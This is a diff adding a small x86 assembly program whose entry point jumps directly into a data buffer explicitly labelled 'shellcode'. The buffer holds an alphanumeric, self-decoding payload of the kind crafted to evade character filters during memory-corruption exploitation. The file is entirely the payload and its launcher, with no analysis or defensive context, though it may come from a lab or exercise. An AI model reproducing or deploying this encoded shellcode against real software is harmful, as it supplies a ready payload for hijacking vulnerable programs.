@@ -1,0 +1,11 @@
+	.intel_syntax noprefix
+	.globl	_start
+	
+	.text
+_start:
+	lea	ecx, shellcode
+        jmp     ecx
+	
+	.data
+shellcode:
+	.ascii "PQRSPUQWahaaaaX5aaaaHhaaa0X5aaaOPDDDTYhaaaaX5aaaaHPQRSPUVPa09haaaAX5aaasPDDDTYhaaaaX5aaaaHPQRSPUVPa09haaaAX5aaaePDDDTYhaaaaX5aaaaHPQRSPUVPa09j1haaa0X5aaapPDDDhaaaEX5aaazPDDDTYhaaaaX5aaaaHPQRSPUVPa09j1PQVSPUVWahhaaa4X5aaa8PDDDTYhaaaaX5aaaaHPQRSPUVPa09j0j0j0YPQRSPUQWahaaa0X5aaatPDDDTYhaaaaX5aaaaHPQRSPUVPa09AAAAAAAAAAAAAAAAAAAAAAAhaaa0X5aaa0PDDDhaaa0X5aaa0PDDDhaaa0X5aaa0PDDDPQRSPUVRaX04GT0"
